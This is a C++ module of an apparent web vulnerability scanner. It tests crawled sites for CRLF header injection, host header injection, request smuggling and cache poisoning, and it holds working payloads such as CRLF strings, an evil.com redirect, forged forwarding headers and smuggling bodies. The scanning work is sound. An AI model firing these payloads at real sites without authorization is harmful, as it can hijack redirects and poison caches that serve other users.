/// @file header_inject.cpp
/// @brief HTTP Header Injection & Smuggling Engine.
#include "header_inject.hpp"

#include <algorithm>
#include <regex>
#include <set>
#include <sstream>

namespace apex {

bool HeaderInjector::header_reflected(const Response &resp,
                                      const std::string &header_name,
                                      const std::string &header_value) {
  for (const auto &[key, val] : resp.headers) {
    std::string key_lower = key;
    std::transform(key_lower.begin(), key_lower.end(), key_lower.begin(),
                   ::tolower);
    std::string name_lower = header_name;
    std::transform(name_lower.begin(), name_lower.end(), name_lower.begin(),
                   ::tolower);
    if (key_lower == name_lower && val.find(header_value) != std::string::npos)
      return true;
  }
  // Also check if injected header appears as a new header in response
  for (const auto &[key, val] : resp.headers) {
    if (val.find(header_value) != std::string::npos)
      return true;
  }
  return false;
}

std::vector<Finding> HeaderInjector::test(const CrawlResult &crawl,
                                          HttpClient &http, const Config &cfg) {
  std::vector<Finding> findings;

  auto f1 = test_crlf_injection(crawl, http, cfg);
  findings.insert(findings.end(), f1.begin(), f1.end());

  auto f2 = test_host_header_injection(crawl, http, cfg);
  findings.insert(findings.end(), f2.begin(), f2.end());

  auto f3 = test_request_smuggling(crawl, http, cfg);
  findings.insert(findings.end(), f3.begin(), f3.end());

  auto f4 = test_cache_poisoning(crawl, http, cfg);
  findings.insert(findings.end(), f4.begin(), f4.end());

  return findings;
}

std::vector<Finding>
HeaderInjector::test_crlf_injection(const CrawlResult &crawl, HttpClient &http,
                                    const Config &cfg) {
  std::vector<Finding> findings;

  // CRLF injection payloads
  std::vector<std::pair<std::string, std::string>> crlf_payloads = {
      {"%0d%0aX-Injected: apex-crlf-test", "URL-encoded lowercase"},
      {"%0D%0AX-Injected: apex-crlf-test", "URL-encoded uppercase"},
      {"%0d%0a%0d%0a<script>alert(1)</script>", "CRLF + body injection"},
      {"%0d%0aSet-Cookie: apex=pwned", "CRLF cookie injection"},
      {"%E5%98%8A%E5%98%8DX-Injected: apex-crlf-test", "Unicode CRLF"},
      {"%0d%0aLocation: https://evil.com", "CRLF redirect injection"},
      {"\\r\\nX-Injected: apex-crlf-test", "Literal \\r\\n"},
      {"\r\nX-Injected: apex-crlf-test", "Raw CRLF"},
  };

  std::string canary_header = "X-Injected";
  std::string canary_value = "apex-crlf-test";

  std::set<std::string> tested;
  for (const auto &param : crawl.params) {
    std::string key = param.url + ":" + param.name;
    if (tested.count(key))
      continue;
    tested.insert(key);

    for (const auto &[payload, desc] : crlf_payloads) {
      std::string test_url;
      if (param.method == "GET") {
        // Inject into query parameter
        std::string base_url = param.url;
        auto qpos = base_url.find('?');
        if (qpos == std::string::npos) {
          test_url = base_url + "?" + param.name + "=" + payload;
        } else {
          test_url = base_url + "&" + param.name + "=" + payload;
        }

        auto resp = http.get(test_url);

        // Check if injected header appears in response
        if (header_reflected(resp, canary_header, canary_value)) {
          Finding f;
          f.type = "header-injection-crlf";
          f.severity = "high";
          f.url = test_url;
          f.detail = "CRLF injection via " + desc + " in parameter '" +
                     param.name + "' — injected header reflected in response";
          f.param = param.name;
          f.payload = payload;
          f.evidence = "Injected '" + canary_header + ": " + canary_value +
                       "' appears in response headers";
          f.confidence = 90;
          f.cwe_id = "CWE-113";
          f.owasp_category = "A03:2021 Injection";
          f.cvss_score = 8.1;
          findings.push_back(f);
          break; // One payload per param is enough
        }

        // Check for body injection (response splitting)
        if (resp.body.find("<script>alert(1)</script>") !=
            std::string::npos) {
          Finding f;
          f.type = "header-injection-response-splitting";
          f.severity = "critical";
          f.url = test_url;
          f.detail =
              "HTTP response splitting via CRLF in parameter '" +
              param.name + "'";
          f.param = param.name;
          f.payload = payload;
          f.evidence = "Injected script tag reflected in response body";
          f.confidence = 95;
          f.cwe_id = "CWE-113";
          f.owasp_category = "A03:2021 Injection";
          f.cvss_score = 9.1;
          findings.push_back(f);
          break;
        }
      } else {
        // POST parameter injection
        std::string body = param.name + "=" + payload;
        auto resp = http.post(param.url, body,
                              "application/x-www-form-urlencoded");

        if (header_reflected(resp, canary_header, canary_value)) {
          Finding f;
          f.type = "header-injection-crlf";
          f.severity = "high";
          f.url = param.url;
          f.detail = "CRLF injection via POST parameter '" + param.name + "'";
          f.param = param.name;
          f.payload = payload;
          f.evidence = "Injected header reflected in response via POST";
          f.confidence = 90;
          f.cwe_id = "CWE-113";
          f.owasp_category = "A03:2021 Injection";
          f.cvss_score = 8.1;
          findings.push_back(f);
          break;
        }
      }
    }

    if (cfg.quick && findings.size() >= 3)
      break;
  }

  return findings;
}

std::vector<Finding>
HeaderInjector::test_host_header_injection(const CrawlResult &crawl,
                                           HttpClient &http,
                                           const Config &cfg) {
  std::vector<Finding> findings;

  // Host header injection vectors
  std::vector<std::pair<std::string, std::string>> host_headers = {
      {"X-Forwarded-Host", "evil.com"},
      {"X-Original-URL", "/admin"},
      {"X-Rewrite-URL", "/admin"},
      {"X-Custom-IP-Authorization", "127.0.0.1"},
      {"X-Forwarded-Server", "evil.com"},
      {"X-HTTP-Host-Override", "evil.com"},
      {"Forwarded", "host=evil.com"},
  };

  std::set<std::string> tested;
  for (const auto &url : crawl.urls) {
    if (tested.size() >= 20)
      break;
    if (tested.count(url))
      continue;
    tested.insert(url);

    // Get baseline
    auto baseline = http.get(url);
    if (baseline.status_code == 0)
      continue;

    for (const auto &[header, value] : host_headers) {
      std::vector<std::pair<std::string, std::string>> hdrs = {
          {header, value}};
      auto resp = http.get(url, hdrs);

      // Check for host header injection indicators
      bool injected = false;
      std::string evidence;

      // Response contains evil.com (password reset poisoning)
      if (resp.body.find("evil.com") != std::string::npos) {
        injected = true;
        evidence = "evil.com reflected in response body via " + header;
      }

      // Different response status (X-Original-URL bypass)
      if (header == "X-Original-URL" || header == "X-Rewrite-URL") {
        if (resp.status_code == 200 && baseline.status_code != 200) {
          injected = true;
          evidence = header + " bypass: " +
                     std::to_string(baseline.status_code) + " → " +
                     std::to_string(resp.status_code);
        }
      }

      // Redirect to evil.com
      for (const auto &[k, v] : resp.headers) {
        std::string k_lower = k;
        std::transform(k_lower.begin(), k_lower.end(), k_lower.begin(),
                       ::tolower);
        if (k_lower == "location" && v.find("evil.com") != std::string::npos) {
          injected = true;
          evidence = "Redirect to evil.com via " + header;
        }
      }

      if (injected) {
        Finding f;
        f.type = "header-injection-host";
        f.severity = "high";
        f.url = url;
        f.detail = "Host header injection via " + header + ": " + value;
        f.payload = header + ": " + value;
        f.evidence = evidence;
        f.confidence = 80;
        f.cwe_id = "CWE-644";
        f.owasp_category = "A03:2021 Injection";
        f.cvss_score = 7.5;
        findings.push_back(f);
        break; // One per URL
      }
    }

    if (cfg.quick && findings.size() >= 3)
      break;
  }

  return findings;
}

std::vector<Finding>
HeaderInjector::test_request_smuggling(const CrawlResult &crawl,
                                       HttpClient &http, const Config &cfg) {
  std::vector<Finding> findings;
  (void)cfg;

  // Request smuggling detection via timing and response differences
  // We test for CL.TE and TE.CL indicators

  std::set<std::string> tested;
  for (const auto &url : crawl.urls) {
    if (tested.size() >= 10)
      break;
    if (tested.count(url))
      continue;
    tested.insert(url);

    // Test CL.TE: Content-Length says short, Transfer-Encoding says chunked
    // If the frontend uses CL and backend uses TE, the extra data smuggles
    {
      std::vector<std::pair<std::string, std::string>> hdrs = {
          {"Transfer-Encoding", "chunked"},
          {"Content-Length", "4"},
      };
      std::string smuggle_body = "1\r\nZ\r\nQ\r\n\r\n";
      auto resp = http.post(url, smuggle_body,
                            "application/x-www-form-urlencoded", hdrs);

      // If we get a timeout or connection reset, it might indicate desync
      if (resp.status_code == 0 &&
          (resp.error.find("timeout") != std::string::npos ||
           resp.error.find("reset") != std::string::npos)) {
        Finding f;
        f.type = "request-smuggling-clte";
        f.severity = "critical";
        f.url = url;
        f.detail = "Potential CL.TE request smuggling — connection "
                   "desync detected";
        f.payload = "CL:4 + chunked body";
        f.evidence =
            "Request caused timeout/reset suggesting desynchronization: " +
            resp.error;
        f.confidence = 55;
        f.cwe_id = "CWE-444";
        f.owasp_category = "A05:2021 Security Misconfiguration";
        f.cvss_score = 9.1;
        findings.push_back(f);
      }

      // Unexpected status might also indicate parsing differences
      if (resp.status_code == 400 || resp.status_code == 501) {
        // Try a normal request first to compare
        auto normal = http.post(url, "test=value",
                                "application/x-www-form-urlencoded");
        if (normal.status_code != 400 && normal.status_code != 501) {
          Finding f;
          f.type = "request-smuggling-indicator";
          f.severity = "medium";
          f.url = url;
          f.detail = "Server responds differently to conflicting "
                     "Content-Length/Transfer-Encoding headers";
          f.payload = "CL + TE conflict";
          f.evidence = "Normal: " + std::to_string(normal.status_code) +
                       ", Smuggle attempt: " +
                       std::to_string(resp.status_code);
          f.confidence = 40;
          f.cwe_id = "CWE-444";
          f.owasp_category = "A05:2021 Security Misconfiguration";
          f.cvss_score = 7.5;
          findings.push_back(f);
        }
      }
    }

    // Test TE.CL: Transfer-Encoding has obfuscated value
    {
      std::vector<std::pair<std::string, std::string>> hdrs = {
          {"Transfer-Encoding", "chunked"},
          {"Transfer-encoding", " chunked"},  // Duplicate with space
      };
      std::string body = "0\r\n\r\n";
      auto resp = http.post(url, body,
                            "application/x-www-form-urlencoded", hdrs);

      // Check for TE obfuscation handling differences
      if (resp.status_code == 0 || resp.status_code >= 500) {
        Finding f;
        f.type = "request-smuggling-te-obfuscation";
        f.severity = "medium";
        f.url = url;
        f.detail = "Server may be vulnerable to TE obfuscation-based "
                   "request smuggling";
        f.payload = "Duplicate Transfer-Encoding headers";
        f.evidence =
            "Response: " + std::to_string(resp.status_code) +
            (resp.error.empty() ? "" : " (" + resp.error + ")");
        f.confidence = 35;
        f.cwe_id = "CWE-444";
        f.owasp_category = "A05:2021 Security Misconfiguration";
        f.cvss_score = 7.5;
        findings.push_back(f);
      }
    }
  }

  return findings;
}

std::vector<Finding>
HeaderInjector::test_cache_poisoning(const CrawlResult &crawl,
                                     HttpClient &http, const Config &cfg) {
  std::vector<Finding> findings;

  // Unkeyed headers that might poison cache
  std::vector<std::pair<std::string, std::string>> poison_headers = {
      {"X-Forwarded-Host", "evil.com"},
      {"X-Forwarded-Scheme", "nothttps"},
      {"X-Forwarded-Proto", "nothttps"},
      {"X-Original-URL", "/evil-path"},
      {"X-HTTP-Method-Override", "POST"},
      {"X-Forwarded-Port", "1337"},
  };

  std::string canary = "apex-cache-poison-" + std::to_string(time(nullptr));

  std::set<std::string> tested;
  for (const auto &url : crawl.urls) {
    if (tested.size() >= 15)
      break;
    if (tested.count(url))
      continue;
    tested.insert(url);

    // Get baseline
    auto baseline = http.get(url);
    if (baseline.status_code != 200)
      continue;

    for (const auto &[header, value] : poison_headers) {
      std::vector<std::pair<std::string, std::string>> hdrs = {
          {header, value}};
      auto poisoned = http.get(url, hdrs);

      if (poisoned.status_code == 0)
        continue;

      // Check if the poisoned response differs from baseline
      bool differs = false;
      std::string evidence;

      // Check body for reflected value
      if (poisoned.body.find(value) != std::string::npos &&
          baseline.body.find(value) == std::string::npos) {
        differs = true;
        evidence = "'" + value + "' reflected in response via " + header;
      }

      // Check for redirect injection
      for (const auto &[k, v] : poisoned.headers) {
        std::string k_lower = k;
        std::transform(k_lower.begin(), k_lower.end(), k_lower.begin(),
                       ::tolower);
        if (k_lower == "location" && v.find(value) != std::string::npos) {
          differs = true;
          evidence = "Redirect poisoned to '" + value + "' via " + header;
        }
      }

      if (differs) {
        // Verify if cached: request again without the header
        auto verify = http.get(url);
        bool cached = verify.body.find(value) != std::string::npos;

        Finding f;
        f.type = "cache-poisoning";
        f.severity = cached ? "critical" : "medium";
        f.url = url;
        f.detail = "Cache poisoning via unkeyed header '" + header + "'";
        f.payload = header + ": " + value;
        f.evidence = evidence + (cached ? " (CONFIRMED: cached response "
                                           "contains poisoned value)"
                                        : " (not confirmed cached)");
        f.confidence = cached ? 90 : 60;
        f.cwe_id = "CWE-444";
        f.owasp_category = "A05:2021 Security Misconfiguration";
        f.cvss_score = cached ? 9.1 : 5.3;
        findings.push_back(f);
        break; // One per URL
      }
    }

    if (cfg.quick && findings.size() >= 3)
      break;
  }

  return findings;
}

} // namespace apex
